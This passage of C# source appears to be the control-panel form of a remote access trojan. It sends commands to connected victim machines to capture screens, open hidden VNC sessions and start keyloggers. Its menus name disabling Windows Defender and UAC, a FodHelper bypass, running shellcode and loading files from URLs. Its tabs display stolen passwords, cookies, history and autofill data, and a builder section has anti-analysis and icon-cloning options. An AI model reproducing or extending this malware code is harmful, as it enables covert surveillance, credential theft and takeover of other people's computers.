			string[] array = Server.Properties.Settings.Default.txtBlocked.Split(',');
			foreach (string text in array)
			{
				if (!string.IsNullOrWhiteSpace(text))
				{
					Settings.Blocked.Add(text);
				}
			}
		}
		catch
		{
		}
		CheckFiles();
		Text = Settings.Version ?? "";
		using (FormPorts formPorts = new FormPorts())
		{
			formPorts.ShowDialog();
		}
		_ = Server.Properties.Settings.Default.Notification;
		new Thread((ThreadStart)delegate
		{
			Connect();
		}).Start();
		Program.hvnc_listner.Start();
		LoadRecovery();
		LoadGrabData();
		LoadBuilder();
	}

	private void Form1_Activated(object sender, EventArgs e)
	{
	}

	private void Form1_Deactivate(object sender, EventArgs e)
	{
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
	}

	private void UpdateUI_Tick(object sender, EventArgs e)
	{
		Text = Settings.Version ?? "";
		toolStripLabel1.Text = $"Online {Settings.connectedClients.Count}                                                            Selected {SelectedClients.Count}                                                            Upload MB {Methods.BytesToString(Settings.SentValue).ToString()}                                                            Download MB  {Methods.BytesToString(Settings.ReceivedValue).ToString()}                                                            Server CPU {(int)performanceCounter1.NextValue()}%                                                            Server Memory {(int)performanceCounter2.NextValue()}%";
	}

	[DllImport("uxtheme", CharSet = CharSet.Unicode)]
	public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

	private void ConnectTimeout_Tick(object sender, EventArgs e)
	{
		try
		{
			foreach (Clients item in Settings.connectedClients.Where((Clients client) => Methods.DiffSeconds(client.LastPing, DateTime.Now) > 20.0).ToList())
			{
				item.Disconnected();
			}
		}
		catch
		{
		}
	}

	private void gridControlClient_Mouse_Up(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			popupMenuClient.ShowPopup(gridControlClient.PointToScreen(e.Location));
		}
	}

	private void StartScreenMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "thumbnails";
		MsgPack msgPack2 = new MsgPack();
		msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
		msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
		msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
		foreach (Clients connectedClient in Settings.connectedClients)
		{
			ThreadPool.QueueUserWorkItem(connectedClient.Send, msgPack2.Encode2Bytes());
		}
		GC.Collect();
	}

	private void StopScreenMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "thumbnailsStop";
			foreach (Clients connectedClient in Settings.connectedClients)
			{
				ThreadPool.QueueUserWorkItem(connectedClient.Send, msgPack.Encode2Bytes());
				connectedClient.LV2 = null;
			}
			listViewScreen.Items.Clear();
			ThumbnailImageList.Images.Clear();
		}
		catch
		{
		}
	}

	private void ClearLogMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		try
		{
			lock (Settings.LockListviewLogs)
			{
				HandleLogs.LogMsgs.Clear();
				UpdateLogGrid();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void listViewScreen_MouseUp(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			popupMenuScreen.ShowPopup(listViewScreen.PointToScreen(e.Location));
		}
	}

	private void SelectAllMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		gridViewClient.SelectAll();
	}

	private void gridViewClient_CustomDrawCell(object sender, RowCellCustomDrawEventArgs e)
	{
		if (gridViewClient.GetSelectedRows().Contains(e.RowHandle))
		{
			e.Cache.FillRectangle(new SolidBrush(Color.Green), e.Bounds);
		}
		if (e.Column != IPColumn)
		{
			return;
		}
		e.DefaultDraw();
		try
		{
			string hwid = (string)gridViewClient.GetRowCellValue(e.RowHandle, HWIDColumn);
			Bitmap countryFlag = Utils.GetCountryFlag(Utils.GetCountryCode(Settings.connectedClientInfo.FirstOrDefault((ClientInfo x) => x.hwid == hwid).ip).ToLower());
			Point location = e.Bounds.Location;
			e.Cache.DrawImage(countryFlag, location);
		}
		catch
		{
		}
	}

	public void UpdateClientGrid()
	{
		Program.mainform.Invoke((MethodInvoker)delegate
		{
			gridControlClient.BeginUpdate();
			gridControlClient.EndUpdate();
		});
	}

	public void UpdateLogGrid()
	{
		Program.mainform.Invoke((MethodInvoker)delegate
		{
			gridControlLog.BeginUpdate();
			gridControlLog.EndUpdate();
		});
	}

	private void xtraTabPage3_Paint(object sender, PaintEventArgs e)
	{
	}

	public void UpdatePing(Clients cl)
	{
		try
		{
			int dataSourceIndex = filteredClientsInfo.FindLastIndex((ClientInfo x) => x.hwid == cl.info.hwid);
			int rowHandle = gridViewClient.GetRowHandle(dataSourceIndex);
			if (gridViewClient.GroupedColumns.Count == 0)
			{
				gridViewClient.SetRowCellValue(rowHandle, PingColumn, cl.info.ping);
			}
		}
		catch
		{
		}
	}

	public void UpdateActWin(Clients cl)
	{
		try
		{
			int dataSourceIndex = filteredClientsInfo.FindLastIndex((ClientInfo x) => x.hwid == cl.info.hwid);
			int rowHandle = gridViewClient.GetRowHandle(dataSourceIndex);
			if (gridViewClient.GroupedColumns.Count == 0)
			{
				gridViewClient.SetRowCellValue(rowHandle, ActiveWinColumn, cl.info.activewin);
			}
		}
		catch
		{
		}
	}

	private void OpenHvncMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		Clients selectedClient = SelectedClient;
		if (selectedClient != null)
		{
			HVNCListener.SetAllowIp(selectedClient);
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\HVNCStub.dll");
			msgPack.ForcePathObject("Info").AsString = "hvnc";
			msgPack.ForcePathObject("HPort").AsInteger = Server.Properties.Settings.Default.HVNCPort;
			ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
			new HandleLogs().Addmsg("Opening hvnc on " + selectedClient.Ip + "...", Color.Black);
		}
	}

	public bool FilterClient(ClientInfo cl)
	{
		string text = textEditSearch.Text.ToLower();
		if (string.IsNullOrEmpty(text))
		{
			return true;
		}
		text = text.ToLower();
		if (cl.summary.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.country.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.user.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.os.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.activewin.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.cpu.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.ram.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.gpu.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.desktopname.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.group.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.note.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.installed.ToLower().Contains(text))
		{
			return true;
		}
		if (cl.permission.ToLower().Contains(text))
		{
			return true;
		}
		return false;
	}

	private void textEditSearch_TextChanged(object sender, EventArgs e)
	{
		Reload();
	}

	public void Reload()
	{
		gridViewClient.ClearGrouping();
		filteredClientsInfo.Clear();
		foreach (ClientInfo item in Settings.connectedClientInfo)
		{
			if (FilterClient(item))
			{
				filteredClientsInfo.Add(item);
			}
		}
		gridControlClient.DataSource = filteredClientsInfo;
		GroupClients(Settings.groupby);
		UpdateClientGrid();
	}

	public void AddClient(Clients cl)
	{
		if (Settings.connectedClients.FirstOrDefault((Clients x) => x.info.hwid == cl.info.hwid) != null)
		{
			return;
		}
		lock (Settings.lockclients)
		{
			Settings.connectedClients.Add(cl);
			if (FilterClient(cl.info))
			{
				filteredClientsInfo.Add(cl.info);
			}
			UpdateClientGrid();
		}
	}

	public bool RemoveClient(Clients cl)
	{
		if (!Settings.connectedClients.Contains(cl))
		{
			return false;
		}
		bool flag = false;
		lock (Settings.lockclients)
		{
			flag = Settings.connectedClients.Remove(cl);
			ClientInfo clientInfo = filteredClientsInfo.FirstOrDefault((ClientInfo x) => x.hwid == cl.info.hwid);
			if (clientInfo == null)
			{
				return false;
			}
			filteredClientsInfo.Remove(clientInfo);
			UpdateClientGrid();
			return flag;
		}
	}

	private void gridViewClient_CustomDrawColumnHeader(object sender, ColumnHeaderCustomDrawEventArgs e)
	{
		e.DefaultDraw();
		e.Cache.DrawRectangle(new Pen(Color.Green), e.Bounds);
	}

	private void gridControlLog_MouseUp(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Right)
		{
			popupMenuLog.ShowPopup(gridControlLog.PointToScreen(e.Location));
		}
	}

	private void TimerKeyLogStopMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		foreach (Clients selectedClient in SelectedClients)
		{
			if (selectedClient.info.keyparam.isEnabled)
			{
				selectedClient.info.keyparam.isEnabled = false;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "keylogsetting";
				msgPack.ForcePathObject("value").AsString = selectedClient.info.keyparam.content;
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
				new HandleLogs().Addmsg("Keylog is Stopped on " + selectedClient.Ip, Color.Red);
			}
		}
	}

	private void TimerKeyLogStartMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		foreach (Clients selectedClient in SelectedClients)
		{
			if (!selectedClient.info.keyparam.isEnabled)
			{
				selectedClient.info.keyparam.isEnabled = true;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "keylogsetting";
				msgPack.ForcePathObject("value").AsString = selectedClient.info.keyparam.content;
				ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
				new HandleLogs().Addmsg("Keylog is Started on " + selectedClient.Ip, Color.Red);
			}
		}
	}

	private void TimerKeyLogSettingMenu_ItemClick(object sender, ItemClickEventArgs e)
	{
		FormTimerKeySetting formTimerKeySetting = new FormTimerKeySetting();
		if (formTimerKeySetting.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		foreach (Clients selectedClient in SelectedClients)
		{
			selectedClient.info.keyparam.interval = formTimerKeySetting.interval;
			selectedClient.info.keyparam.filter = formTimerKeySetting.filter;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "keylogsetting";
			msgPack.ForcePathObject("value").AsString = selectedClient.info.keyparam.content;
			ThreadPool.QueueUserWorkItem(selectedClient.Send, msgPack.Encode2Bytes());
		}
		if (SelectedClients.Count > 0)
		{
			new HandleLogs().Addmsg($"Changed Keylog Settings on {SelectedClients.Count} Clients", Color.Red);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		DevExpress.Utils.SuperToolTip superToolTip = new DevExpress.Utils.SuperToolTip();
		DevExpress.Utils.ToolTipItem toolTipItem = new DevExpress.Utils.ToolTipItem();
		DevExpress.Utils.SuperToolTip superToolTip2 = new DevExpress.Utils.SuperToolTip();
		DevExpress.Utils.ToolTipItem toolTipItem2 = new DevExpress.Utils.ToolTipItem();
		DevExpress.Utils.SuperToolTip superToolTip3 = new DevExpress.Utils.SuperToolTip();
		DevExpress.Utils.ToolTipItem toolTipItem3 = new DevExpress.Utils.ToolTipItem();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormMain));
		this.ping = new System.Windows.Forms.Timer(this.components);
		this.UpdateUI = new System.Windows.Forms.Timer(this.components);
		this.ThumbnailImageList = new System.Windows.Forms.ImageList(this.components);
		this.performanceCounter1 = new System.Diagnostics.PerformanceCounter();
		this.performanceCounter2 = new System.Diagnostics.PerformanceCounter();
		this.TimerTask = new System.Windows.Forms.Timer(this.components);
		this.xtraTabControl1 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage1 = new DevExpress.XtraTab.XtraTabPage();
		this.splitContainer4 = new System.Windows.Forms.SplitContainer();
		this.panel3 = new System.Windows.Forms.Panel();
		this.textEditSearch = new DevExpress.XtraEditors.TextEdit();
		this.barManager1 = new DevExpress.XtraBars.BarManager(this.components);
		this.barDockControlTop = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlBottom = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlLeft = new DevExpress.XtraBars.BarDockControl();
		this.barDockControlRight = new DevExpress.XtraBars.BarDockControl();
		this.initallpluginmenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem1 = new DevExpress.XtraBars.BarSubItem();
		this.groupbydefaultmenu = new DevExpress.XtraBars.BarButtonItem();
		this.groupByLocationMenu = new DevExpress.XtraBars.BarButtonItem();
		this.GroupByOSMenu = new DevExpress.XtraBars.BarButtonItem();
		this.GroupbyAntivirusMenu = new DevExpress.XtraBars.BarButtonItem();
		this.GroupByNoteMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barButtonItem7 = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem2 = new DevExpress.XtraBars.BarSubItem();
		this.RemoteDesktopMenu = new DevExpress.XtraBars.BarButtonItem();
		this.NetstatMenu = new DevExpress.XtraBars.BarButtonItem();
		this.ProcManagerMenu = new DevExpress.XtraBars.BarButtonItem();
		this.FileManagerMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RemoteCameraMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RemoteShellMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RecordMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RegEditMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem3 = new DevExpress.XtraBars.BarSubItem();
		this.RunShellCodeMenu = new DevExpress.XtraBars.BarButtonItem();
		this.SendMessageBoxMenu = new DevExpress.XtraBars.BarButtonItem();
		this.VisitWebSiteMenu = new DevExpress.XtraBars.BarButtonItem();
		this.ChangeBackMenu = new DevExpress.XtraBars.BarButtonItem();
		this.FileSearcherMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem4 = new DevExpress.XtraBars.BarSubItem();
		this.LogoutSystemMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RestartSystemMenu = new DevExpress.XtraBars.BarButtonItem();
		this.ShutDownMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem5 = new DevExpress.XtraBars.BarSubItem();
		this.DisableWDMenu = new DevExpress.XtraBars.BarButtonItem();
		this.DisableUACMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem6 = new DevExpress.XtraBars.BarSubItem();
		this.CleanUpMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RunAsMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem7 = new DevExpress.XtraBars.BarSubItem();
		this.SchTaskInstallStubMenu = new DevExpress.XtraBars.BarButtonItem();
		this.SchTaskUnInstallStubMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem8 = new DevExpress.XtraBars.BarSubItem();
		this.DisableRecoveryMenu = new DevExpress.XtraBars.BarButtonItem();
		this.LoadRecoveryInfoMenu = new DevExpress.XtraBars.BarButtonItem();
		this.LoadAnalyzedInfoMenu = new DevExpress.XtraBars.BarButtonItem();
		this.LoadGeneralInfoMenu = new DevExpress.XtraBars.BarButtonItem();
		this.AddNoteMenu = new DevExpress.XtraBars.BarButtonItem();
		this.GotoSettingMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem9 = new DevExpress.XtraBars.BarSubItem();
		this.SendFileToMemoryMenu = new DevExpress.XtraBars.BarButtonItem();
		this.SendFileFromUrlMenu = new DevExpress.XtraBars.BarButtonItem();
		this.SendFileToDiskMenu = new DevExpress.XtraBars.BarButtonItem();
		this.KeyLogMenu = new DevExpress.XtraBars.BarButtonItem();
		this.ReverseProxyMenu = new DevExpress.XtraBars.BarButtonItem();
		this.FunMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem10 = new DevExpress.XtraBars.BarSubItem();
		this.StopStubMenu = new DevExpress.XtraBars.BarButtonItem();
		this.RestartStubMenu = new DevExpress.XtraBars.BarButtonItem();
		this.UpdateStubMenu = new DevExpress.XtraBars.BarButtonItem();
		this.UninstallStubMenu = new DevExpress.XtraBars.BarButtonItem();
		this.NoSystemStubMenu = new DevExpress.XtraBars.BarButtonItem();
		this.ClientFolderMenu = new DevExpress.XtraBars.BarButtonItem();
		this.FodHelperMenu = new DevExpress.XtraBars.BarButtonItem();
		this.CompLauncherMenu = new DevExpress.XtraBars.BarButtonItem();
		this.NormalInstallStubMenu = new DevExpress.XtraBars.BarButtonItem();
		this.NormalUnInstallStubMenu = new DevExpress.XtraBars.BarButtonItem();
		this.LoadKeyLogInfoMenu = new DevExpress.XtraBars.BarButtonItem();
		this.SaveAllPassword = new DevExpress.XtraBars.BarButtonItem();
		this.SaveAllCookies = new DevExpress.XtraBars.BarButtonItem();
		this.SaveAllHistory = new DevExpress.XtraBars.BarButtonItem();
		this.SaveAllAutoFill = new DevExpress.XtraBars.BarButtonItem();
		this.SaveAllBookmarks = new DevExpress.XtraBars.BarButtonItem();
		this.RefreshRecoveryMenu = new DevExpress.XtraBars.BarButtonItem();
		this.Task_SendFileFromUrl = new DevExpress.XtraBars.BarButtonItem();
		this.TaskSendFileTODiskMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskSendFileToMemoryMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskDisableUACMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskDisableWDMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskInstallSchTaskMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskUpdateAllMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskAutoKeyloggerMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskFakeBinderMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskDeleteMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskLoadStealDataMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskLoadRecoveryDataMenu = new DevExpress.XtraBars.BarButtonItem();
		this.StartScreenMenu = new DevExpress.XtraBars.BarButtonItem();
		this.StopScreenMenu = new DevExpress.XtraBars.BarButtonItem();
		this.ClearLogMenu = new DevExpress.XtraBars.BarButtonItem();
		this.SelectAllMenu = new DevExpress.XtraBars.BarButtonItem();
		this.OpenHvncMenu = new DevExpress.XtraBars.BarButtonItem();
		this.CopyIpMenu = new DevExpress.XtraBars.BarButtonItem();
		this.barSubItem11 = new DevExpress.XtraBars.BarSubItem();
		this.barSubItem12 = new DevExpress.XtraBars.BarSubItem();
		this.TimerKeyLogStartMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TimerKeyLogStopMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TimerKeyLogSettingMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskOfflineKeylogMenu = new DevExpress.XtraBars.BarButtonItem();
		this.TaskTimerKeylogMenu = new DevExpress.XtraBars.BarButtonItem();
		this.gridControlClient = new DevExpress.XtraGrid.GridControl();
		this.gridViewClient = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.IPColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.CountryColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.NoteColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.GroupColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.HWIDColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.DesktopColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.UserNameColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.PermissionColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.CPUCOlumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.RAMColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.GPUColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.CameraColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.OSColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.AVColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.InstallTimeColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.PingColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.ActiveWinColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.xtraTabPage12 = new DevExpress.XtraTab.XtraTabPage();
		this.gridControlLog = new DevExpress.XtraGrid.GridControl();
		this.gridViewLog = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.TimeColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.MsgColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.xtraTabPage2 = new DevExpress.XtraTab.XtraTabPage();
		this.panelControl2 = new DevExpress.XtraEditors.PanelControl();
		this.listViewScreen = new System.Windows.Forms.ListView();
		this.xtraTabPage3 = new DevExpress.XtraTab.XtraTabPage();
		this.gridControlTask = new DevExpress.XtraGrid.GridControl();
		this.gridViewTask = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.TaskNameColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.TaskRunTimesColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.xtraTabPage4 = new DevExpress.XtraTab.XtraTabPage();
		this.tableLayoutPanel1 = new System.Windows.Forms.TableLayoutPanel();
		this.panel2 = new System.Windows.Forms.Panel();
		this.listViewRecoveryClients = new DevExpress.XtraEditors.ListBoxControl();
		this.xtraTabControl2 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage7 = new DevExpress.XtraTab.XtraTabPage();
		this.splitContainer3 = new System.Windows.Forms.SplitContainer();
		this.panel1 = new System.Windows.Forms.Panel();
		this.txtPasswordSearch = new DevExpress.XtraEditors.TextEdit();
		this.toolStripLabelPasswordCount = new System.Windows.Forms.Label();
		this.chkAll = new DevExpress.XtraEditors.CheckEdit();
		this.label1 = new System.Windows.Forms.Label();
		this.gridControlRecoveryPassword = new DevExpress.XtraGrid.GridControl();
		this.gridViewRecoveryPassword = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.RecoveryNameColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.RecoveryPasswordColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.RecoveryUrlColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.RecoveryTargetColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.xtraTabPage8 = new DevExpress.XtraTab.XtraTabPage();
		this.gridControlCookie = new DevExpress.XtraGrid.GridControl();
		this.gridViewCookie = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.CookieNameColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.CookieValueColum = new DevExpress.XtraGrid.Columns.GridColumn();
		this.CookieDomainColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.CookieExpColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.xtraTabPage9 = new DevExpress.XtraTab.XtraTabPage();
		this.gridControlHistory = new DevExpress.XtraGrid.GridControl();
		this.gridViewHistory = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.HistoryUrlColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.HistoryTitleColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.xtraTabPage10 = new DevExpress.XtraTab.XtraTabPage();
		this.gridControlBookmarks = new DevExpress.XtraGrid.GridControl();
		this.gridViewBookmarks = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.BmUrlColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.BmTitleColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.xtraTabPage11 = new DevExpress.XtraTab.XtraTabPage();
		this.gridControlAutofill = new DevExpress.XtraGrid.GridControl();
		this.gridViewAutofill = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.AutoFillNameColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.AutofillValueColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.xtraTabPage5 = new DevExpress.XtraTab.XtraTabPage();
		this.splitContainer2 = new System.Windows.Forms.SplitContainer();
		this.listViewGrabClients = new DevExpress.XtraEditors.ListBoxControl();
		this.gridControlGraber = new DevExpress.XtraGrid.GridControl();
		this.gridViewGraber = new DevExpress.XtraGrid.Views.Grid.GridView();
		this.GraberCategoryColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.GraberValueColumn = new DevExpress.XtraGrid.Columns.GridColumn();
		this.xtraTabPage6 = new DevExpress.XtraTab.XtraTabPage();
		this.xtraScrollableControl1 = new DevExpress.XtraEditors.XtraScrollableControl();
		this.xtraTabControl3 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage13 = new DevExpress.XtraTab.XtraTabPage();
		this.groupControl1 = new DevExpress.XtraEditors.GroupControl();
		this.listBoxIP = new DevExpress.XtraEditors.ListBoxControl();
		this.txtPaste_bin = new DevExpress.XtraEditors.TextEdit();
		this.chkPaste_bin = new DevExpress.XtraEditors.CheckEdit();
		this.btnAddIP = new DevExpress.XtraEditors.SimpleButton();
		this.textIP = new DevExpress.XtraEditors.TextEdit();
		this.btnRemoveIP = new DevExpress.XtraEditors.SimpleButton();
		this.groupControl4 = new DevExpress.XtraEditors.GroupControl();
		this.label4 = new System.Windows.Forms.Label();
		this.label3 = new System.Windows.Forms.Label();
		this.comboBoxFolder = new DevExpress.XtraEditors.ComboBoxEdit();
		this.numDelay = new DevExpress.XtraEditors.SpinEdit();
		this.txtMutex = new DevExpress.XtraEditors.TextEdit();
		this.txtGroup = new DevExpress.XtraEditors.TextEdit();
		this.label17 = new System.Windows.Forms.Label();
		this.textFilename = new DevExpress.XtraEditors.TextEdit();
		this.chkAntiProcess = new DevExpress.XtraEditors.CheckEdit();
		this.label2 = new System.Windows.Forms.Label();
		this.chkAnti = new DevExpress.XtraEditors.CheckEdit();
		this.btnShellcode = new DevExpress.XtraEditors.SimpleButton();
		this.btnBuild = new DevExpress.XtraEditors.SimpleButton();
		this.label5 = new System.Windows.Forms.Label();
		this.chkBsod = new DevExpress.XtraEditors.CheckEdit();
		this.checkBox1 = new DevExpress.XtraEditors.CheckEdit();
		this.label6 = new System.Windows.Forms.Label();
		this.label16 = new System.Windows.Forms.Label();
		this.radioGroupArchitecture = new DevExpress.XtraEditors.RadioGroup();
		this.groupControl2 = new DevExpress.XtraEditors.GroupControl();
		this.listBoxPort = new DevExpress.XtraEditors.ListBoxControl();
		this.textPort = new DevExpress.XtraEditors.SpinEdit();
		this.btnAddPort = new DevExpress.XtraEditors.SimpleButton();
		this.btnRemovePort = new DevExpress.XtraEditors.SimpleButton();
		this.groupControl3 = new DevExpress.XtraEditors.GroupControl();
		this.txtFileVersion = new DevExpress.XtraEditors.TextEdit();
		this.txtProductVersion = new DevExpress.XtraEditors.TextEdit();
		this.txtOriginalFilename = new DevExpress.XtraEditors.TextEdit();
		this.txtTrademarks = new DevExpress.XtraEditors.TextEdit();
		this.txtCopyright = new DevExpress.XtraEditors.TextEdit();
		this.txtProduct = new DevExpress.XtraEditors.TextEdit();
		this.txtIcon = new DevExpress.XtraEditors.TextEdit();
		this.txtCompany = new DevExpress.XtraEditors.TextEdit();
		this.chkIcon = new DevExpress.XtraEditors.CheckEdit();
		this.txtDescription = new DevExpress.XtraEditors.TextEdit();
		this.label8 = new System.Windows.Forms.Label();
		this.btnAssembly = new DevExpress.XtraEditors.CheckEdit();
		this.label7 = new System.Windows.Forms.Label();
		this.label9 = new System.Windows.Forms.Label();
		this.btnIcon = new DevExpress.XtraEditors.SimpleButton();
		this.label10 = new System.Windows.Forms.Label();
		this.label11 = new System.Windows.Forms.Label();
		this.label12 = new System.Windows.Forms.Label();
		this.btnClone = new DevExpress.XtraEditors.SimpleButton();
		this.label13 = new System.Windows.Forms.Label();
		this.label14 = new System.Windows.Forms.Label();
		this.picIcon = new System.Windows.Forms.PictureBox();
		this.ConnectTimeout = new System.Windows.Forms.Timer(this.components);
		this.directoryEntry1 = new System.DirectoryServices.DirectoryEntry();
		this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
		this.popupMenuClient = new DevExpress.XtraBars.PopupMenu(this.components);
		this.popupMenuRecovery = new DevExpress.XtraBars.PopupMenu(this.components);
		this.popupMenuTask = new DevExpress.XtraBars.PopupMenu(this.components);
		this.popupMenuScreen = new DevExpress.XtraBars.PopupMenu(this.components);
		this.popupMenuLog = new DevExpress.XtraBars.PopupMenu(this.components);
		this.panelControl1 = new DevExpress.XtraEditors.PanelControl();
		this.toolStripLabel1 = new DevExpress.XtraEditors.LabelControl();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter2).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).BeginInit();
		this.xtraTabControl1.SuspendLayout();
		this.xtraTabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.splitContainer4).BeginInit();
		this.splitContainer4.Panel1.SuspendLayout();
		this.splitContainer4.Panel2.SuspendLayout();
		this.splitContainer4.SuspendLayout();
		this.panel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.textEditSearch.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlClient).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewClient).BeginInit();
		this.xtraTabPage12.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.gridControlLog).BeginInit();
